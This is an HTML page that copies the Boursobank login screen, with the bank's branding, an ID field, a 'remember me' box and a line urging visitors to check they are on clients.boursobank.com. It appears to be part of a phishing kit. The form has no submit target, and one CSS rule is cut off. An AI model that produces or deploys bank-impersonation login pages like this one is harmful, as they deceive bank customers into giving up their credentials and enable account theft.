<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire - Boursobank</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Logo principal */
        .top-logo {
            margin-bottom: 70px;
            width: 100%;
            height: 20%;
        }

        .top-logo img {
            max-width: 200px;
        }

        /* Formulaire */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            height: 550px;
            overflow: hidden;
            position: relative;
        }

        /* Bande rose */
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        /* Contenu du formulaire */
        .form-content {
            padding: 70px;
        }

        /* Deuxième logo */
        .form-logo img {
            max-width: 50px;
            margin-bottom: 15px;
        }

        /* Titre principal */
        h1 {
            font-weight: 500;
            color: #003883;
            font-size: 1.3rem;
            
            margin-bottom: 10px;
        }

        /* Texte de vérification */
        .verification-text {
            font-size: 0.7rem;
            margin-bottom: 5px;
            color: #667e9b !important;
        }

        .verification-box {
            color: #27ae60;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        /* Input style */
        .input-line {
            border: none;
            border-bottom: 2px solid #00bfff;
            outline: none;
            font-size: 1rem;
            padding: 5px;
            width: 100%;
            letter-spacing: 3px; /* Espacement entre caractères */
            text-transform: uppercase; /* Pour les lettres majuscules */
        }

        /* Mémorisation */
        .remember-box {
            display: flex;
            align-items: center;
            font-size: 0.8rem;
            color: #617894;
            font-weight: 500;
            margin: 15px 0;
        }

        .remember-box input {
            margin-right: 5px;
            hei
        }

        /* Bouton */
        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
            width: 100%;
        }

        .btn:hover {
            background: #e60063;
        }

        /* Lien oublié */
        .forgot-link {
            display: block;
            margin-top: 10px;
            font-size: 0.9rem;
            color: #ff006f;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Liens en bas */
        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <div class="form-content">
                <!-- Logo secondaire -->
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>

                <!-- Titre -->
                <h1>Mon identifiant</h1>

                <!-- Texte de vérification -->
                <div class="verification-text">
                    Veuillez toujours vérifier que vous êtes sur la bonne adresse
                </div>
                <div class="verification-box">
                    clients.boursobank.com
                </div>

                <!-- Champ identifiant -->
                <input 
                    type="text" 
                    class="input-line" 
                    
                    maxlength="19">

                <!-- Mémorisation -->
                <div class="remember-box">
                    <input type="checkbox" id="remember">
                    <label for="remember">Mémoriser mon identifiant</label>
                </div>

                <!-- Bouton -->
                <button class="btn">Suivant</button>
                <a href="#" class="forgot-link">Identifiant oublié ?</a>
            </div>
        </div>

        <!-- Liens de bas de page -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>
</body>
</html>
